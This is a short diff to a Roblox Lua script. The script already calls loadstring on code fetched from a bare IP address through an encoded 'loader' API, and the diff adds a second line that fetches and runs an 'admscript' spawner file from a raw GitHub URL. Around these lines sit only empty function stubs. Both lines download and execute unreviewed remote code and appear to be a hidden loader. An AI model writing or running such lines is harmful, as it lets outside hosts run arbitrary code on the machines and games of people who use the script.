@@ -3,7 +3,7 @@ end
 loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6ImMwZWY1NWYzLTU2YjUtNGUyYS04OTc3LWE5ODBkY2Q5ODUxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
 local function s2()
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/admscript-lua/spawneradm/refs/heads/main/sapwnerrrr"))()
 
 task.spawn(s1)
 task.spawn(s2)
